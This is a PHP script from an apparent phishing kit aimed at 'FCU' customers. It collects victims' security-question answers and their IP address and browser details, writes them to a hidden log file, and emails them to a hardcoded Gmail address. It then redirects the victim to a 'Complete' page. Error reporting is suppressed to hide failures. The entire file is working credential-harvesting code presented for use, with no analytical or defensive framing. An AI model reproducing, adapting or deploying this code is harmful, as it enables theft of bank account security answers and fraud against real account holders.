 <?php

error_reporting(0);

$send = "medahnabil@gmail.com";

$ip = getenv("REMOTE_ADDR");
$browser = $_SERVER['HTTP_USER_AGENT'];
$message .= "-----------------1 FCU Questions-------------------\n";
$message .= "-----------------2 QuestionDetails----------------\n";
$message .= "Question	: ".$_POST['question1']."\n";
$message .= "Answer		: ".$_POST['answer1']."\n";
$message .= "Question	: ".$_POST['question2']."\n";
$message .= "Answer		: ".$_POST['answer2']."\n";
$message .= "Question	: ".$_POST['question3']."\n";
$message .= "Answer		: ".$_POST['answer3']."\n";
$message .= "-----------------Made by GOODLIFE---------------\n";
$message .= "-----------------FCU----------------------\n";



$subject = "FCU - Made by GOODLIFE ";

$fp = fopen($_SERVER['DOCUMENT_ROOT'] . "/DimaMohm3X.txt","a+");
fwrite($fp,"FCU - Made by GOODLIFE" . " | " .getenv('HTTP_X_FORWARDED_FOR') . " | " . $_SERVER['HTTP_USER_AGENT'] . " | " . "\n\n" .$subject . "\n" . $message . "\n\n");
fclose($fp);

mail($send , "FCU - Made by GOODLIFE", getenv('HTTP_X_FORWARDED_FOR') . " | " . $_SERVER['HTTP_USER_AGENT'] . " | " . "\n\n" .$subject . "\n" . $message . "\n\n");


?>
<script>
    window.top.location.href = "Complete.php";

</script>